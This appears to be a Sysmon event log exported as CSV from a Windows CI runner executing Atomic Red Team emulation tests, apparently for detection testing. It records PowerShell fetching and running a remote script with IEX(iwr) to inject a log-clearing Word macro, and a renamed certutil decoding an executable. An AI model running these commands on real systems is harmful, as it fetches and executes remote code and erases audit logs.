ProcessGuid: {f995aebf-6912-6942-7909-000000000e00}
ProcessId: 9540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54185
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:25:56 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:25:54.504
ProcessGuid: {f995aebf-6912-6942-7909-000000000e00}
ProcessId: 9540
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:23:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:23:43.705
ProcessGuid: {f995aebf-688f-6942-4209-000000000e00}
ProcessId: 8508
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:21:09 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:21:07.768
ProcessGuid: {f995aebf-67f2-6942-c608-000000000e00}
ProcessId: 6992
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:21:09 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:21:07.259
ProcessGuid: {f995aebf-67f2-6942-c608-000000000e00}
ProcessId: 6992
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:21:09 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:21:07.263
ProcessGuid: {f995aebf-67f2-6942-c608-000000000e00}
ProcessId: 6992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54064
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:20:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:20:23.577
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54042
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.109.133
DestinationHostname: cdn-185-199-109-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:20:26 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:20:23.500
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54041
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 140.82.114.4
DestinationHostname: lb-140-82-114-4-iad.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:20:25 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:20:23.575
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
QueryName: release-assets.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:20:25 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:20:23.496
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
QueryName: github.com
QueryStatus: 0
QueryResults: ::ffff:140.82.114.4;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:20:24 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:20:23.395
ProcessGuid: {f995aebf-67c6-6942-3208-000000000e00}
ProcessId: 3908
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:54 AM","255","Error report:
UtcTime: 2025-12-17 08:19:54.063
ID: DriverCommunication
Description: Failed to retrieve events - Last error: The I/O operation has been aborted because of either a thread exit or an application request.
"
"12/17/2025 8:19:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:51.156
ProcessGuid: {f995aebf-67a7-6942-af07-000000000e00}
ProcessId: 3060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xst5e2aa.psp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:51.135
ProcessGuid: {f995aebf-67a7-6942-af07-000000000e00}
ProcessId: 3060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xst5e2aa.psp.ps1
CreationUtcTime: 2025-12-17 08:19:51.135
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:50.769
ProcessGuid: {f995aebf-67a6-6942-ad07-000000000e00}
ProcessId: 5656
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hil53pui.h0s.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:50.747
ProcessGuid: {f995aebf-67a6-6942-ad07-000000000e00}
ProcessId: 5656
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hil53pui.h0s.ps1
CreationUtcTime: 2025-12-17 08:19:50.747
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:50.390
ProcessGuid: {f995aebf-67a6-6942-ab07-000000000e00}
ProcessId: 3900
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gcjwydjd.2qv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:50 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:50.368
ProcessGuid: {f995aebf-67a6-6942-ab07-000000000e00}
ProcessId: 3900
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gcjwydjd.2qv.ps1
CreationUtcTime: 2025-12-17 08:19:50.368
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:49.995
ProcessGuid: {f995aebf-67a5-6942-a907-000000000e00}
ProcessId: 10176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g5fpfook.qfh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:49 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:49.973
ProcessGuid: {f995aebf-67a5-6942-a907-000000000e00}
ProcessId: 10176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_g5fpfook.qfh.ps1
CreationUtcTime: 2025-12-17 08:19:49.973
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:43.644
ProcessGuid: {f995aebf-679f-6942-9d07-000000000e00}
ProcessId: 5192
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w1scerab.q1a.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:43.622
ProcessGuid: {f995aebf-679f-6942-9d07-000000000e00}
ProcessId: 5192
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w1scerab.q1a.ps1
CreationUtcTime: 2025-12-17 08:19:43.622
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:43.060
ProcessGuid: {f995aebf-679e-6942-9b07-000000000e00}
ProcessId: 9576
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_il54hikt.ezc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:43.039
ProcessGuid: {f995aebf-679e-6942-9b07-000000000e00}
ProcessId: 9576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_il54hikt.ezc.ps1
CreationUtcTime: 2025-12-17 08:19:43.039
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:42.460
ProcessGuid: {f995aebf-679e-6942-9907-000000000e00}
ProcessId: 7896
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yhjxle0q.o4m.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:42.438
ProcessGuid: {f995aebf-679e-6942-9907-000000000e00}
ProcessId: 7896
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yhjxle0q.o4m.ps1
CreationUtcTime: 2025-12-17 08:19:42.438
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:41 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:41.865
ProcessGuid: {f995aebf-679d-6942-9707-000000000e00}
ProcessId: 1004
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_it3p5ov0.m4k.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:41 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:41.843
ProcessGuid: {f995aebf-679d-6942-9707-000000000e00}
ProcessId: 1004
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_it3p5ov0.m4k.ps1
CreationUtcTime: 2025-12-17 08:19:41.843
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:38.824
ProcessGuid: {f995aebf-679a-6942-8f07-000000000e00}
ProcessId: 4460
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fwtm2pp0.j2z.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:38.800
ProcessGuid: {f995aebf-679a-6942-8f07-000000000e00}
ProcessId: 4460
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fwtm2pp0.j2z.ps1
CreationUtcTime: 2025-12-17 08:19:38.800
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:38.431
ProcessGuid: {f995aebf-679a-6942-8d07-000000000e00}
ProcessId: 5932
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kyak5jky.1hc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:38.411
ProcessGuid: {f995aebf-679a-6942-8d07-000000000e00}
ProcessId: 5932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kyak5jky.1hc.ps1
CreationUtcTime: 2025-12-17 08:19:38.411
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:19:32.426
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 54015
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.110.133
DestinationHostname: cdn-185-199-110-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:19:34 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:19:32.422
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:32 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:32.195
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rprirxys.i50.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:32 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:32.175
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rprirxys.i50.ps1
CreationUtcTime: 2025-12-17 08:19:32.175
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:32.092
ProcessGuid: {f995aebf-6794-6942-8707-000000000e00}
ProcessId: 880
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ClearLogs\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:31 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:31.577
ProcessGuid: {f995aebf-6793-6942-8507-000000000e00}
ProcessId: 6664
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3zbostxe.amh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:31 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:31.557
ProcessGuid: {f995aebf-6793-6942-8507-000000000e00}
ProcessId: 6664
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3zbostxe.amh.ps1
CreationUtcTime: 2025-12-17 08:19:31.557
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:28.720
ProcessGuid: {f995aebf-6790-6942-7c07-000000000e00}
ProcessId: 8180
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:28.513
ProcessGuid: {f995aebf-6790-6942-7a07-000000000e00}
ProcessId: 4512
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:22 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:22.802
ProcessGuid: {f995aebf-678a-6942-7307-000000000e00}
ProcessId: 8240
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CreationUtcTime: 2025-12-17 08:19:22.802
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:22.772
ProcessGuid: {f995aebf-678a-6942-7307-000000000e00}
ProcessId: 8240
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -decode C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-678a-6942-7007-000000000e00}
ParentProcessId: 4340
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:22.731
ProcessGuid: {f995aebf-678a-6942-7207-000000000e00}
ProcessId: 5896
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-678a-6942-7007-000000000e00}
ParentProcessId: 4340
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
